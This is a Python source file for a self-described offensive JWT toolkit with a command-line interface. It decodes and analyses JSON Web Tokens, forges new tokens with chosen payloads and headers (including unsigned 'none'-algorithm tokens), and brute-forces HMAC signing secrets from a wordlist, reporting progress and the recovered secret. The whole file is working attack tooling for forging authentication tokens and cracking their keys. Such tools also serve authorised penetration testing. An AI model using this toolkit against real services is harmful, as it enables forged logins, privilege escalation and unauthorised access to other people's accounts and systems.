import base64
import json
import hmac
import hashlib
import time
from datetime import datetime, timedelta

class JWTToolkit:
    """Self-contained JWT manipulation toolkit for offensive security"""
    
    def __init__(self, secret="secret"):
        self.secret = secret.encode()
        self.supported_algs = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512
        }
    
    def _decode_segment(self, segment: str) -> dict:
        """Base64 URL-safe decoding with padding"""
        segment += '=' * (4 - len(segment) % 4)
        return json.loads(base64.urlsafe_b64decode(segment))
    
    def _encode_segment(self, data: dict) -> str:
        """Base64 URL-safe encoding without padding"""
        json_str = json.dumps(data, separators=(',', ':'))
        return base64.urlsafe_b64encode(json_str.encode()).decode().replace('=', '')
    
    def analyze_jwt(self, token: str) -> str:
        """Analyze JWT algorithm and security posture"""
        try:
            header_segment, _, _ = token.partition('.')
            header = self._decode_segment(header_segment)
            alg = header.get("alg", "UNKNOWN")
            
            analysis = f"ALGORITHM\n-----------\n{alg}\n"
            
            # Security analysis
            if alg == "none":
                analysis += "\nSECURITY WARNING:\n- Unsecured tokens can be trivially forged\n"
            elif alg in ["HS256", "HS384", "HS512"]:
                analysis += "\nSECURITY WARNING:\n- Symmetric algorithm vulnerable to brute-force attacks\n"
            
            return analysis
        except Exception as e:
            return f"ANALYSIS ERROR: {str(e)}"

    def decode_jwt(self, token: str) -> str:
        """Decode JWT with format enforcement"""
        try:
            segments = token.split('.')
            if len(segments) != 3:
                return "ERROR: Invalid JWT format (expected 3 segments)"
                
            header = self._decode_segment(segments[0])
            payload = self._decode_segment(segments[1])
            
            return (
                f"ALGORITHM\n-----------\n{header.get('alg', 'UNKNOWN')}\n\n"
                f"Decoded JWT\n-----------\n"
                f"HEADER:\n{json.dumps(header, indent=2)}\n\n"
                f"PAYLOAD:\n{json.dumps(payload, indent=2)}\n"
                "-----------"
            )
        except Exception as e:
            return f"DECODE ERROR: {str(e)}"

    def encode_jwt(
        self, 
        payload: dict, 
        algorithm: str = "HS256", 
        header: dict = None,
        expire_minutes: int = 15
    ) -> str:
        """Encode JWT with pentesting-friendly options"""
        try:
            # Prepare header
            if not header:
                header = {"typ": "JWT", "alg": algorithm}
                
            # Add automatic expiration if not provided
            if "exp" not in payload:
                payload["exp"] = int(time.time()) + expire_minutes * 60
                
            # Encode segments
            header_enc = self._encode_segment(header)
            payload_enc = self._encode_segment(payload)
            unsigned_token = f"{header_enc}.{payload_enc}"
            
            # Generate signature
            if algorithm == "none":
                signature = ""
            elif algorithm in self.supported_algs:
                digest = self.supported_algs[algorithm]
                signature = hmac.new(
                    self.secret, 
                    unsigned_token.encode(), 
                    digestmod=digest
                ).digest()
                signature = base64.urlsafe_b64encode(signature).decode().replace('=', '')
            else:
                return f"UNSUPPORTED ALGORITHM: {algorithm}"
                
            return f"{unsigned_token}.{signature}"
        except Exception as e:
            return f"ENCODE ERROR: {str(e)}"

    def brute_force_jwt(self, token: str, wordlist: list, algorithm: str = "HS256", progress_interval: int = 1000) -> str:
        """
        Brute-force JWT secret with progress reporting
        Returns immediately when secret is found
        """
        try:
            segments = token.split('.')
            if len(segments) != 3:
                return "ERROR: Invalid JWT format"
            
            header_str, payload_str, target_sig = segments
            unsigned_token = f"{header_str}.{payload_str}"
            
            # Determine hash algorithm
            if algorithm not in self.supported_algs:
                return f"UNSUPPORTED ALGORITHM: {algorithm}"
            
            hash_func = self.supported_algs[algorithm]
            start_time = time.time()
            tested = 0
            
            for secret in wordlist:
                # Skip empty lines
                if not secret.strip():
                    continue
                    
                secret = secret.strip().encode()
                test_sig = hmac.new(
                    secret,
                    unsigned_token.encode(),
                    digestmod=hash_func
                ).digest()
                test_sig = base64.urlsafe_b64encode(test_sig).decode().replace('=', '')
                
                tested += 1
                if tested % progress_interval == 0:
                    elapsed = time.time() - start_time
                    print(f"Tested {tested} secrets ({tested/elapsed:.1f}/sec) - Current: {secret.decode()}")
                
                if test_sig == target_sig:
                    elapsed = time.time() - start_time
                    return (
                        f"\nSECRET FOUND: {secret.decode()}\n"
                        f"Tested {tested} secrets in {elapsed:.1f} seconds\n"
                        f"Speed: {tested/elapsed:.1f} secrets/sec"
                    )
            
            elapsed = time.time() - start_time
            return (
                f"\nSECRET NOT FOUND\n"
                f"Tested {tested} secrets in {elapsed:.1f} seconds\n"
                f"Speed: {tested/elapsed:.1f} secrets/sec"
            )
        except Exception as e:
            return f"BRUTE-FORCE ERROR: {str(e)}"

# CLI Interface
if __name__ == "__main__":
    import argparse
    toolkit = JWTToolkit()
    
    parser = argparse.ArgumentParser(description="Offensive JWT Toolkit")
    subparsers = parser.add_subparsers(dest="command", required=True)
    
    # Decode command
    decode_parser = subparsers.add_parser("decode")
    decode_parser.add_argument("token", help="JWT token to decode")
    
    # Analyze command
    analyze_parser = subparsers.add_parser("analyze")
    analyze_parser.add_argument("token", help="JWT token to analyze")
    
    # Encode command
    encode_parser = subparsers.add_parser("encode")
    encode_parser.add_argument("payload", help="JSON payload (e.g., '{\"user\":\"admin\"}')")
    encode_parser.add_argument("-a", "--alg", default="HS256", help="Signing algorithm (default: HS256)")
    encode_parser.add_argument("-s", "--secret", default="secret", help="Signing secret")
    encode_parser.add_argument("-hd", "--header", help="Custom header JSON")
    #encode_parser.add_argument("-p", "--payload", help="payload")


    # Brute-force command
    brute_parser = subparsers.add_parser("brute", help="Brute-force JWT secret")
    brute_parser.add_argument("token", help="JWT token to crack")
    brute_parser.add_argument("wordlist", help="Path to wordlist file")
    brute_parser.add_argument("-a", "--alg", default="HS256", help="Algorithm used (default: HS256)")
    brute_parser.add_argument("-p", "--progress", type=int, default=1000, 
                             help="Progress report interval (default: 1000)")

    
    args = parser.parse_args()
    
    if args.command == "decode":
        print(toolkit.decode_jwt(args.token))
        
    elif args.command == "analyze":
        print(toolkit.analyze_jwt(args.token))
        
    elif args.command == "encode":
        try:
            payload = json.loads(args.payload)
            header = json.loads(args.header) if args.header else None
            toolkit.secret = args.secret.encode()
            result = toolkit.encode_jwt(payload, args.alg, header)
            print("\nEncoded JWT\n")
            print(result)
        except json.JSONDecodeError:
            print("ERROR: Invalid JSON format")

    elif args.command == "brute":
        try:
            print(f"\nStarting brute-force attack on JWT...")
            print(f"Algorithm: {args.alg}")
            print(f"Wordlist: {args.wordlist}")
            
            with open(args.wordlist, 'r', errors='ignore') as f:
                wordlist = f.readlines()
                
            print(f"Loaded {len(wordlist)} secrets to test\n")
            
            result = toolkit.brute_force_jwt(
                args.token,
                wordlist,
                algorithm=args.alg,
                progress_interval=args.progress
            )
            print(result)
        except FileNotFoundError:
            print(f"ERROR: Wordlist file not found - {args.wordlist}")
        except Exception as e:
            print(f"ERROR: {str(e)}")
